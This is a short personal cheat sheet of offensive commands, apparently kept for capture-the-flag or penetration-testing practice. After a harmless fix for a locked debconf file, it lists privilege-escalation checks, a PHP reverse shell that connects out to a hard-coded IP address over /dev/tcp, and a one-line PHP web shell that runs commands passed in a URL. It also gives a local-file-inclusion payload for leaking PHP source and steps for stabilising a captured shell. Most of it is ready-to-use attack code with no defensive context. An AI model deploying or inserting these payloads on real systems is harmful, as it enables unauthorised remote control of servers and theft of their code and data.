# This section is for documenting common commands that are a pain to try and find again
### debconf: DbDriver "config": /var/cache/debconf/config.dat is locked by another process: Resource temporarily unavailable
    sudo fuser -v /var/cache/debconf/config.dat
    sudo kill 8123

## Privesc
- ### Find SUID binaries
        find / -perm -u=s -type f 2>/dev/null

- ### list sudo-able binaries
        sudo -l

## PHP

- ### php reverse shell
        <?php exec("/bin/bash -c 'bash -i > /dev/tcp/10.2.64.239/1234 0>&1'");

- ### php web shell
        <?php system($_GET[cmd]);?>

- ### php leak source code w/ LFI
        pagename=php://filter/convert.base64-encode/resource=login

### Stabilize shell
    python -c 'import pty; pty.spawn("/bin/bash")'
    Ctrl ^Z
    echo $TERM
    stty -a
    stty raw -echo
    reset
    xterm

# TO BE CONTINUED

